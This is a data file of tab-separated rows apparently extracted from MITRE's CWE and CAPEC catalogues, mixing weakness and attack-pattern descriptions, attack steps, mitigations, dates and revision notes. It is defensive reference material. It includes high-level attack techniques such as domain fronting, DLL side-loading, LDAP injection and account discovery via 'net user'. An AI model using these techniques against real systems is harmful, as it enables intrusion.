13466	72	An attacker could cause the software to skip critical steps or perform them in the wrong order, bypassing its intended business logic. This can sometimes have security implications.
17810	35	MITRE
7525	78	Low
7779	76	2019-04-04
16494	39	2018-03-27
18898	74	2
18219	56	PeerOf
14929	35	MITRE
22453	45	Class
13071	43	Simple
23876	63	Read Memory
8116	36	http://www.securityfocus.com/bid/17204/info
20671	62	updated Common_Consequences
18591	31	699
13669	39	2011-06-01
24900	62	updated Description, Name, Observed_Examples
16857	51	2014-06-23
12201	35	MITRE
14555	76	2015-11-09
18637	49	2010
12529	35	MITRE
20978	92	Experiment
15296	25	Low
6025	28	CWE Content Team
8800	79	Confidentiality
25173	28	Eric Dalci
19663	63	Execute Unauthorized Code or Commands
12095	63	Varies by Context
6701	62	updated Common_Consequences, Description, Name
24792	66	Authentication using JAAS
15175	81	Confidentiality
22817	39	2008-07-01
15978	35	MITRE
8029	39	2008-08-15
19144	28	CWE Content Team
21850	28	CWE Content Team
14732	103	Primary
12637	40	The target must be running the Microsoft NTFS file system.
10655	21	CWE Content Team
16915	79	Authorization
9135	59	Updated Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances
18360	72	in some contexts, a negative value could lead to resource consumption.
14247	92	Experiment
19810	63	Read Application Data
14151	26	Architecture and Design
20163	35	MITRE
13012	35	MITRE
15869	35	MITRE
7811	50	Design: Use libraries and templates that minimize unfiltered input.
22050	62	updated Common_Consequences, References, Relationships
6568	28	CWE Content Team
13981	39	2012-05-11
17806	56	ChildOf
15347	103	Primary
15711	62	updated Relationships, Taxonomy_Mappings
18613	43	Simple
22248	77	Architecture or Design Review
19035	88	Path Traversal: '\..\filename'
24028	91	Implementation
24009	95	An attacker can call an API exposed by the target host.
20820	50	Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow accounts to be a local administrator on more than one system.
20961	62	updated Relationships, Taxonomy_Mappings
10345	55	CAPEC Content Team
13205	62	updated Description
11319	35	MITRE
8443	73	Sequentially request a list of common base files to each directory discovered.
19966	39	2011-06-27
23749	79	Confidentiality
10762	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
19922	62	updated Description, Name
20919	23	This OS fingerprinting probe performs a checksum on any ASCII data contained within the data portion or a RST packet. Some operating systems will report a human-readable text message in the payload of a 'RST' (reset) packet when specific types of connection errors occur. RFC 1122 allows text payloads within reset packets but not all operating systems or routers implement this functionality.
18910	35	MITRE
25419	26	Implementation
10212	28	CWE Content Team
20494	42	Add integrity checks to detect tampering.
5649	35	MITRE
8589	62	updated Relationships, Other_Notes, Taxonomy_Mappings
21874	62	updated Relationships, Taxonomy_Mappings
8631	62	updated Common_Consequences
24579	39	2017-11-08
18543	43	Simple
11884	26	Implementation
7950	76	2019-09-30
19761	39	2009-05-27
19325	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
24613	54	Medium
22395	35	MITRE
15014	35	MITRE
21765	91	Implementation
11283	39	2009-01-12
22047	28	CWE Content Team
23434	55	CAPEC Content Team
14719	39	2019-06-20
24636	28	CWE Content Team
21075	93	Defense in Depth
15937	35	MITRE
17381	28	CWE Content Team
7466	25	Low
12447	28	CWE Content Team
15663	39	2008-09-08
21693	59	Updated Description Summary
24689	21	CWE Content Team
5888	39	2014-07-30
11251	39	2010-02-16
8251	76	2018-07-31
6491	62	updated Demonstrative_Examples, Observed_Examples, Potential_Mitigations
8614	62	updated Potential_Mitigations
18630	95	[Explore target website] The attacker first explores the target website to determine pieces of functionality that are of interest to him (e.g. money transfers). The attacker will need a legitimate user account on the target website. It would help to have two accounts.
8435	60	20
13761	31	1000
23128	28	CWE Content Team
19745	81	Integrity
22270	62	updated Demonstrative_Examples, Potential_Mitigations
12571	69	Draft
6019	35	MITRE
6335	35	MITRE
7422	62	updated Common_Consequences
10428	28	CWE Content Team
21833	62	updated Detection_Factors, Potential_Mitigations, References, Taxonomy_Mappings
24211	28	CWE Content Team
19745	63	Read Application Data
19321	24	MITRE
12145	40	Target server software must be a HTTP server that performs web logging.
23877	31	1000
14864	25	Medium
21602	100	The MITRE Corporation
7390	33	Mike Hamburg
7138	81	Integrity
18387	62	updated Common_Consequences, Observed_Examples
20842	50	Do not use information available to the user in order to generate session ID (e.g., time).
13817	69	Draft
24509	35	MITRE
8980	73	Use a browser to manually explore the website and analyze how the application processes inputs.
16292	81	Access Control
10664	28	CWE Content Team
15013	35	MITRE
7201	73	Try to use Unicode encoding of content in HTML in order to bypass validation routines.
17320	56	ChildOf
24086	81	Other
24884	59	Updated Related_Attack_Patterns
7980	39	2019-01-03
21074	21	Anonymous Tool Vendor (under NDA)
14730	101	CAPEC Content Team
8619	28	CWE Content Team
8803	35	MITRE
7938	53	The MITRE Corporation
18787	57	Indirect
9909	88	Free of Memory not on the Heap
17435	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, References, Related_Weaknesses, Typical_Likelihood_of_Exploit, Typical_Severity
15324	48	11
19078	104	863
8700	33	J. Oates
19860	104	478
7698	101	CAPEC Content Team
17356	57	Primary
15873	74	1
21487	23	The ASP.NET application does not use an input validation framework.
7717	26	Implementation
16283	63	Reduce Performance
19377	53	The MITRE Corporation
22406	28	CWE Content Team
6825	74	1
17849	76	2019-04-04
12272	55	CAPEC Content Team
9524	35	MITRE
12094	28	CWE Content Team
12452	63	Varies by Context
7974	35	MITRE
15170	76	2019-09-30
9576	23	Adversaries can provide contradictory destinations when sending messages. Traffic is routed in networks using the domain names in various headers available at different levels of the OSI model. In a Content Delivery Network (CDN) multiple domains might be available, and if there are contradictory domain names provided it is possible to route traffic to an inappropriate destination. The technique, called Domain Fronting, involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. An alternative technique, called Domainless Fronting, is similar, but the SNI field is left blank.
11354	35	MITRE
24682	85	569
24663	101	CAPEC Content Team
24503	31	1000
17407	67	Medium
11026	35	MITRE
10960	56	ChildOf
21152	100	The MITRE Corporation
20850	39	2009-07-27
22657	69	Incomplete
22494	72	Often the actions performed by injected control code are unlogged.
21792	62	updated Related_Attack_Patterns, Relationships
10045	35	MITRE
25045	76	2019-04-04
20897	43	Simple
20938	23	The software performs a comparison that only examines a portion of a factor before determining whether there is a match, such as a substring, leading to resultant weaknesses.
19147	51	2014-06-23
14845	35	MITRE
7860	35	MITRE
17950	31	1000
13937	30	John-Paul Verkamp
8027	28	CWE Content Team
8465	81	Integrity
10186	45	Variant
8453	39	2008-09-08
9317	42	Avoid making conversion between numeric types. Always check for the allowed ranges.
5621	39	2019-01-03
14338	53	The MITRE Corporation
18698	77	Dynamic Analysis with Automated Results Interpretation
23638	28	CWE Content Team
20404	28	Eric Dalci
17176	89	Standard
23004	74	1
22228	62	updated Relationships
20216	35	MITRE
7369	35	Cigital
17078	56	ChildOf
21778	43	Simple
20340	63	Modify Application Data
15999	66	CSRF - The Cross-Site Request Forgery (CSRF/XSRF) FAQ
5776	47	Modify Data
15196	97	HTTP Request Splitting
21378	39	2014-07-30
12928	104	186
13909	95	[Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the URL containing the homoglpyh character(s).
22869	42	While double-checked locking can be achieved in some languages, it is inherently flawed in Java before 1.5, and cannot be achieved without compromising platform independence. Before Java 1.5, only use of the synchronized keyword is known to work. Beginning in Java 1.5, use of the "volatile" keyword allows double-checked locking to work successfully, although there is some debate as to whether it achieves sufficient performance gains. See references.
14770	39	2008-09-08
15184	35	MITRE
10595	35	MITRE
6588	62	complete rewrite of the entire entry
24960	63	Alter Execution Logic
20931	59	Updated Activation_Zone, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, References, Related_Weaknesses, Solutions_and_Mitigations
12982	62	updated Common_Consequences
15974	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
12951	62	updated Relationships, Taxonomy_Mappings
19761	28	CWE Content Team
21739	28	CWE Content Team
19333	59	Updated Related_Attack_Patterns
19413	103	Primary
17402	28	Eric Dalci
9787	62	updated Potential_Mitigations, References
20513	39	2008-09-08
8493	54	Medium
22967	81	Access Control
12255	28	CWE Content Team
18289	35	MITRE
21790	59	Updated References, Related_Weaknesses
17540	93	Limited
20865	76	2019-04-04
19744	76	2019-09-30
21871	39	2018-03-27
19349	39	2019-06-20
12431	62	updated Common_Consequences
16181	51	2014-06-23
24307	39	2011-06-01
23981	31	1000
6906	35	MITRE
17383	78	High
19855	28	CWE Content Team
11792	70	The OWASP Guide Project
14605	24	MITRE
17548	31	699
18200	95	[Spider] Using a browser or an automated tool, an adversary follows all public links on a web site. He records all the links, the forms and all potential user-controllable input points for the web application.
16386	81	Confidentiality
12233	61	Stable
19459	35	MITRE
19459	39	2010-04-05
12177	91	Architecture and Design
14624	74	2
13671	62	updated Demonstrative_Examples
22660	69	Draft
12404	62	updated Related_Attack_Patterns
23826	100	The MITRE Corporation
23164	62	updated Potential_Mitigations, Time_of_Introduction
11326	45	Base
14917	51	2014-06-23
13870	39	2009-12-28
6110	35	MITRE
6007	61	Draft
9355	90	Language-Independent
17094	63	DoS: Crash, Exit, or Restart
8488	44	SOAR Partial
18951	27	None: No specialized resources are required to execute this type of attack. The only requirement is the ability to send requests to the target.
6548	28	Eric Dalci
9869	35	MITRE
7248	39	2011-03-29
10658	35	MITRE
22888	96	2008-09-09
15692	69	Incomplete
13473	88	Improper Handling of Insufficient Privileges
9626	23	An adversary places a malicious version of a Dynamic-Link Library (DLL) in the Windows Side-by-Side (WinSxS) directory to trick the operating system into loading this malicious DLL instead of a legitimate DLL. Programs specify the location of the DLLs to load via the use of WinSxS manifests or DLL redirection and if they aren't used then Windows searches in a predefined set of directories to locate the file. If the applications improperly specify a required DLL or WinSxS manifests aren't explicit about the characteristics of the DLL to be loaded, they can be vulnerable to side-loading.
18415	35	MITRE
23362	39	2011-06-01
20031	42	Do not use AWT/Swing when writing EJBs.
11998	85	540
9946	31	699
18468	35	MITRE
10720	39	2017-11-08
20561	100	The MITRE Corporation
5628	28	Eric Dalci
10189	59	Updated Related_Weaknesses
13592	62	updated Relationships
16002	101	CAPEC Content Team
22278	28	Eric Dalci
8613	35	MITRE
21134	61	Stable
16809	92	Exploit
21694	71	2003
12179	103	Primary
20431	42	Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7].
17881	28	CWE Content Team
22101	59	Updated References, Typical_Severity
19485	28	CWE Content Team
19247	35	MITRE
19076	62	updated Description, Name
7693	35	MITRE
21374	47	Read Data
15520	103	Primary
12317	50	Use of hardened baseband firmware on retransmission device to detect and prevent the use of weak cellular encryption.
13312	90	ASP.NET
12177	42	Where possible, use communications protocols or data formats that provide strict boundaries between control and data. If this is not feasible, ensure that the protocols or formats allow the communicating components to explicitly state which encoding/decoding method is being used. Some template frameworks provide built-in support.
16647	31	699
7978	46	Multiple catch blocks can get ugly and repetitive, but "condensing" catch blocks by catching a high-level class like Exception can obscure exceptions that deserve special treatment or that should not be caught at this point in the program. Catching an overly broad exception essentially defeats the purpose of Java's typed exceptions, and can become particularly dangerous if the program grows and begins to throw new types of exceptions. The new exception types will not receive any attention.
11545	56	ChildOf
6816	35	MITRE
18834	28	CWE Content Team
6502	73	Investigation of the target environment to determine the types of technologies used to parse the incoming HTTP requests. Attempt to understand the parsing chain traversed by the incoming HTTP request.
23260	28	CWE Content Team
24036	85	563
6139	81	Confidentiality
8117	35	MITRE
12184	40	The victim's browser is not configured to reject all cookiesThe victim visits a website that serves the attackers' evercookie
12742	102	ChildOf
24807	39	2011-06-27
7511	79	Non-Repudiation
17940	28	CWE Content Team
22416	92	Exploit
12791	62	updated Type
6161	35	Cigital
22323	63	Read Files or Directories
23818	89	Detailed
19106	101	CAPEC Content Team
14832	40	This type of an attack requires the ability to generate a large amount of HTTP traffic to send to a target server.
19412	76	2017-08-04
9481	81	Integrity
15398	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
14251	43	Simple
8756	35	MITRE
10890	35	MITRE
16617	42	Determine the necessary entropy to adequately provide for randomness and predictability. This can be achieved by increasing the number of bits of objects such as keys and seeds.
9819	39	2010-06-21
8913	42	Use framework method calls instead of using sockets directly.
21642	90	Language-Independent
8354	28	CWE Content Team
11241	35	MITRE
25411	95	[Cycle through values for each parameter.] Depending on the nature of the application, the attacker now cycles through values of each parameter and observes the effects of this modification in the data returned by the server
21361	50	Design: Limit program privileges, so if commands circumvent program input validation or filter routines then commands do not running under a privileged account
10830	35	MITRE
8072	53	The MITRE Corporation
25367	52	Automated methods may be useful for recognizing commonly-used libraries or features that have become obsolete.
22401	35	Cigital
10912	94	Faking the source of data or services can be used to create a false trail in logs as the target will associate any actions with the impersonated identity instead of the adversary.
17379	103	Primary
19818	89	Detailed
23798	39	2008-07-01
14119	80	Hardware creation and manufacture of replacement components.
13973	62	updated Relationships
19038	57	Indirect
21719	28	CWE Content Team
9240	28	CWE Content Team
21528	62	updated Maintenance_Notes, Relationships, Relationship_Notes, Taxonomy_Mappings
12579	39	2017-11-08
12202	40	The ability to send UDP datagrams to a host and receive ICMP error messages from that host. In cases where particular types of ICMP messaging is disallowed, the reliability of UDP scanning drops off sharply.
15618	25	Medium
23825	39	2014-07-30
9582	28	CWE Content Team
13869	31	1000
20110	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
14726	28	CWE Content Team
15433	28	CWE Content Team
23619	39	2009-03-10
20065	39	2011-06-01
25314	81	Other
10944	46	This prevents the software from acting on associated resources or performing other behaviors that are controlled by the presence of the lock. Relevant locks might include an exclusive lock or mutex, or modifying a shared resource that is treated as a lock. If the lock can be held for an indefinite period of time, then the denial of service could be permanent.
7889	28	CWE Content Team
19592	28	CWE Content Team
24611	39	2012-10-30
13748	42	Remove dead code before deploying the application.
19959	62	updated Type
21073	62	updated Applicable_Platforms
15157	31	699
15951	91	Implementation
19808	35	Cigital
13014	62	updated References
8424	28	CWE Content Team
10331	36	https://www.forumsys.com/wp-content/uploads/2014/01/Anatomy-of-a-Web-Services-Attack.pdf
18294	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
24727	62	updated Description, Maintenance_Notes, Relationships, Type
12870	86	http://www.cs.wustl.edu/~schmidt/PDF/TSS-pattern.pdf
20242	35	MITRE
12908	35	MITRE
24844	44	High
23270	30	Bryan Sullivan
20776	79	Availability
20076	39	2008-09-08
19237	23	An adversary exploits functionality meant to identify information about the domain accounts and their permissions on the target system to an authorized user. By knowing what accounts are registered on the target system, the adversary can inform further and more targeted malicious behavior. Example Windows commands which can acquire this information are: "net user" and "dsquery".
9617	103	Primary
8600	81	Other
18841	50	Design: Enforce principle of least privilege
14068	39	2011-06-01
18059	47	Bypass Protection Mechanism
18393	52	Code analysis can require knowledge of API behaviors for library functions that might return NULL, reducing the chances of detection when unknown libraries are used.
11749	44	High
9987	56	ChildOf
15737	56	ChildOf
22736	79	Authorization
13667	100	The MITRE Corporation
20679	28	CWE Content Team
19419	39	2014-07-30
12906	39	2010-02-16
8526	23	The product's code, documentation, or other artifacts do not      consistently use the same naming conventions for variables, callables, groups of      related callables, I/O capabilities, data types, file names, or similar types of      elements.
21771	28	CWE Content Team
9608	35	MITRE
22574	39	2011-06-01
23118	28	CWE Content Team
20889	35	MITRE
11906	39	2011-09-13
17793	44	SOAR Partial
20336	35	MITRE
20873	28	CWE Content Team
24134	39	2008-11-24
13484	69	Incomplete
7152	100	The MITRE Corporation
14214	50	Carefully validate and sanitize all user-controllable data prior to passing it to the XML parser routine. Ensure that the resultant data is safe to pass to the XML parser.
15451	81	Confidentiality
7874	51	2014-06-23
15716	39	2019-06-20
24486	28	CWE Content Team
6689	28	CWE Content Team
9390	28	CWE Content Team
23639	86	http://www.securityfocus.com/archive/1/archive/1/460089/100/100/threaded
18139	102	CanFollow
23052	35	MITRE
22236	39	2011-06-27
21177	28	CWE Content Team
12196	52	This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.
18786	60	16
7367	69	Incomplete
6734	28	CWE Content Team
23756	35	MITRE
18216	45	Base
22758	80	There is a wide variety of fuzzing tools available.
13385	39	2014-07-30
24519	28	CWE Content Team
11648	104	154
15854	35	MITRE
10353	42	Run or compile the software using features or extensions that automatically provide a protection mechanism that mitigates or eliminates buffer overflows.                   For example, certain compilers and extensions provide automatic buffer overflow detection mechanisms that are built into the compiled code. Examples include the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice.
17237	39	2008-07-01
22895	31	1000
21179	35	MITRE
13826	39	2008-07-01
5968	28	CWE Content Team
20386	28	CWE Content Team
24061	35	MITRE
15329	28	CWE Content Team
16462	62	updated Applicable_Platforms, Common_Consequences, Maintenance_Notes, Relationships, Other_Notes, Taxonomy_Mappings
13513	90	Perl
7277	45	Base
9234	47	Gain Privileges
9135	100	The MITRE Corporation
17563	28	Eric Dalci
17587	80	The adversary requires strong inter-personal and communication skills.
20861	44	High
14983	62	updated Description, Other_Notes
23380	28	CWE Content Team
7649	39	2011-06-27
7146	103	Primary
19797	48	07
13180	35	Cigital
14642	62	updated Potential_Mitigations
13555	101	CAPEC Content Team
21821	73	For each user ID to be locked out, perform the lockout procedure discovered in the first step.
20081	45	Base
14252	62	updated Relationships
15839	62	updated Description
16045	86	https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet
25139	35	MITRE
20629	92	Explore
9435	43	Simple
12148	50	Design: Protect the schema against unauthorized modification.
16152	35	MITRE
19896	66	Double clicking on MS Office documents from Windows Explorer may execute arbitrary programs in some cases
22859	30	Stuart McClure
19514	28	CWE Content Team
16149	39	2008-07-01
12715	31	1000
17497	39	2009-10-29
11260	35	MITRE
5632	62	updated Potential_Mitigations
24914	26	Operation
8209	35	MITRE
21231	39	2011-06-01
23903	28	CWE Content Team
19918	59	Updated Related_Weaknesses
9393	63	Varies by Context
10077	101	CAPEC Content Team
7872	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
18957	62	updated Description
21239	76	2018-07-31
10008	28	Eric Dalci
12889	60	03
8246	35	MITRE
20354	80	The attacker needs to be aware of SSI technology, determine the nature of injection and be able to craft input that results in the SSI directives being executed.
14611	85	208
25185	91	Implementation
12887	103	Primary
15204	102	ChildOf
5788	62	updated Related_Attack_Patterns, Relationships
16599	62	updated Applicable_Platforms, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Potential_Mitigations, References, Related_Attack_Patterns, Relationships
22257	39	2011-06-01
16669	81	Integrity
23359	35	MITRE
23094	28	CWE Content Team
23272	62	updated Common_Consequences
12335	28	CWE Content Team
24910	62	updated Relationships
25242	92	Explore
6317	28	CWE Content Team
23702	35	Cigital
12288	97	SQL Injection
21097	77	Dynamic Analysis with Automated Results Interpretation
14752	63	Modify Memory
12397	42	Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.
6982	80	To send recursive entity expansion XML messages.
22243	91	Architecture and Design
15735	62	updated Description
21007	101	CAPEC Content Team
11712	76	2015-11-09
24414	63	Execute Unauthorized Code or Commands
7730	59	Updated Related_Weaknesses
11791	62	updated Relationships, Taxonomy_Mappings
15715	66	The night the log was forged
22366	56	ChildOf
13818	100	The MITRE Corporation
14409	62	updated Common_Consequences
14188	102	ChildOf
25018	28	CWE Content Team
23537	23	For each web page, the application should have an appropriate caching policy specifying the extent to which the page and its form fields should be cached.
6981	35	KDM Analytics
12491	101	CAPEC Content Team
24294	62	updated Common_Consequences
22365	39	2014-02-18
7226	63	Bypass Protection Mechanism
24411	28	CWE Content Team
16753	23	An attacker manipulates or crafts an LDAP query for the purpose of undermining the security of the target. Some applications use user input to create LDAP queries that are processed by an LDAP server. For example, a user might provide their username during authentication and the username might be inserted in an LDAP query during the authentication process. An attacker could use this input to inject additional commands into an LDAP query that could disclose sensitive information. For example, entering a * in the aforementioned query might return information about all users on the system. This attack is very similar to an SQL injection attack in that it manipulates a query to gather additional information or coerce a particular return value.
5884	63	Alter Execution Logic
12495	35	MITRE
20004	56	CanPrecede
11970	49	2012
15121	90	Java
23725	62	updated Enabling_Factors_for_Exploitation
8056	35	MITRE
20300	35	MITRE
11093	62	updated Common_Consequences
13074	81	Integrity
7791	27	The attacker must understand how the logging mechanism works.                Optionally, the attacker must know the location and the format of individual entries of the log files.
14885	39	2011-06-01
11764	39	2009-03-10
13821	56	ChildOf
8579	53	The MITRE Corporation
21801	28	Eric Dalci
20708	39	2010-06-21
11828	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
24203	39	2017-11-08
11433	57	Indirect
19902	51	2015-11-09
12166	39	2019-06-20
14841	62	Improved the White_Box_Definition
10456	62	updated Relationships
22139	86	http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/avoid-race.html
10303	55	CAPEC Content Team
20035	76	2017-01-09
25344	35	MITRE
16489	31	700
24813	101	CAPEC Content Team
11458	35	MITRE
11526	35	MITRE
16546	28	CWE Content Team
19034	35	MITRE
16246	40	The cloud provider must not assuredly delete part or all of the sensitive data for which they are responsible.The adversary must have the ability to interact with the system.
24580	35	MITRE
24097	104	1068
11997	39	2010-09-27
23915	89	Detailed
15853	28	CWE Content Team
5800	78	Very High
20761	26	Implementation
24838	39	2011-03-29
16737	39	2010-12-13
15189	62	updated Weakness_Ordinalities
16251	97	Documentation Alteration to Cause Errors in System Design
6296	79	Availability
15774	78	High
20131	39	2010-09-27
17683	40	The target host is logging the action and data of the user.
17711	74	2
17458	47	Read Data
10688	69	Draft
10662	101	CAPEC Content Team
22377	39	2008-10-14
17465	100	The MITRE Corporation
16404	39	2008-11-13
9472	76	2019-09-30
18821	104	185
17178	39	2011-03-29
14909	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
23409	62	updated Common_Consequences
23275	39	2013-07-17
12353	102	ChildOf
6243	35	MITRE
18887	88	Improper Neutralization of Internal Special Elements
19712	96	2018-07-02
5770	104	468
16512	28	CWE Content Team
7320	48	11
10837	62	updated Applicable_Platforms, Potential_Mitigations, Related_Attack_Patterns
20700	23	The product generates a core dump file in a directory that is accessible to actors outside of the intended control sphere.
7162	61	Stable
12273	62	updated Description, Name
21222	103	Primary
9454	54	High
6579	39	2011-06-01
18339	67	High
5842	97	Flash File Overlay
21471	23	The software, when opening a file or directory, does not sufficiently handle when the name is associated with a hard link to a target that is outside of the intended control sphere. This could allow an attacker to cause the software to operate on unauthorized files.
13706	28	Eric Dalci
19203	31	699
11310	39	2017-11-08
20354	25	Medium
18442	27	A satellite uplink station.
24110	62	updated Potential_Mitigations
18473	35	MITRE
18434	39	2011-03-29
8029	62	Suggested OWASP Top Ten 2004 mapping
25364	62	updated Description
21583	39	2008-11-24
6351	28	CWE Content Team
8113	44	High
10205	43	Simple
21359	93	Defense in Depth
9003	103	Primary
12778	28	CWE Content Team
21045	62	updated Relationships, Taxonomy_Mappings
14358	90	PHP
18722	88	Improper Restriction of XML External Entity Reference
10193	27	The attacker must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed.
21380	28	CWE Content Team
23562	77	Architecture or Design Review
6457	78	Low
20123	76	2019-04-04
20421	31	699
9046	39	2008-11-24
23954	73	The adversary can leverage the sample or test API to conduct several types of attacks such as Man-in-the-Middle attacks, keylogging, Cross Site Scripting (XSS), and more.
12569	39	2008-10-14
17970	42	Consider storing cryptographic hashes of passwords as an alternative to storing in plaintext.
13652	28	CWE Content Team
23972	28	CWE Content Team
17870	103	Primary
25290	90	Language-Independent
22764	28	CWE Content Team
16902	35	MITRE
10928	39	2012-05-11
12227	35	MITRE
14204	103	Primary
20558	28	CWE Content Team
22260	86	http://msdn.microsoft.com/en-us/library/ms537361(VS.85).aspx
6039	59	Updated Related_Attack_Patterns
23332	91	Architecture and Design
12296	27	Ability to issues hundreds of HTTP requests
24015	39	2011-06-01
9972	35	MITRE
16518	101	CAPEC Content Team
7817	39	2008-07-01
18065	28	CWE Content Team
10501	62	updated Common_Consequences, Other_Notes
21482	28	CWE Content Team
7209	59	Updated References
21517	43	Simple
13778	35	MITRE
7082	39	2012-05-11
13056	35	MITRE
20041	100	The MITRE Corporation
14377	103	Primary
14675	78	High
13646	42	Perform proper forward and reverse DNS lookups to detect DNS spoofing.
25162	35	Cigital
7605	59	Updated Attack_Phases
20178	63	Gain Privileges or Assume Identity
14415	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
23706	39	2009-05-27
18793	89	Meta
6534	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
24243	35	MITRE
7094	102	ChildOf
18137	78	High
10226	62	updated Relationships, Taxonomy_Mappings
7085	79	Confidentiality
19480	53	The MITRE Corporation
22754	91	Architecture and Design
12637	27	The attacker must have command line or programmatic access to the target's files system with write/read permissions.
11642	57	Indirect
18895	28	CWE Content Team
9752	45	Base
16367	88	Reliance on a Single Factor in a Security Decision
23060	62	updated Demonstrative_Examples
5816	28	CWE Content Team
18621	25	High
12869	67	Medium
10383	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
17393	62	updated Common_Consequences
7963	26	Architecture and Design
6362	35	MITRE
19294	47	Bypass Protection Mechanism
22285	25	High
21615	28	CWE Content Team
19958	44	High
16911	31	700
23193	35	MITRE
16667	35	Cigital
20054	81	Availability
7922	62	updated Applicable_Platforms
9673	103	Primary
6837	39	2012-05-11
7575	28	CWE Content Team
22919	28	CWE Content Team
11432	28	CWE Content Team
21397	28	CWE Content Team
15530	79	Integrity
5681	40	Advanced knowledge about the target system and sub-components.
22824	28	CWE Content Team
25275	28	CWE Content Team
6295	56	ChildOf
18001	27	UDP pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.
9780	104	103
23671	35	MITRE
12380	36	https://www.giac.org/paper/gcwn/230/alternate-data-streams-shadows-light/104234
10877	35	MITRE
7429	62	updated Detection_Factors, Relationships, Taxonomy_Mappings
6830	35	MITRE
14159	35	MITRE
23289	103	Primary
8303	104	754
22326	28	CWE Content Team
20098	62	updated Related_Attack_Patterns, Relationships
7301	62	updated Potential_Mitigations, Time_of_Introduction
18368	95	[Inject malicious data in the database] Leverage SQL injection to inject data in the database that could later be used to achieve command injection if ever used as a command line argument
21019	40	None
11187	61	Draft
18540	62	updated Demonstrative_Examples, Description, Other_Notes, Potential_Mitigations, Relationships
21272	39	2013-02-21
10707	39	2019-01-03
17641	39	2009-10-29
15962	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.
9216	96	2018-07-02
14786	39	2008-07-01
18986	76	2018-07-31
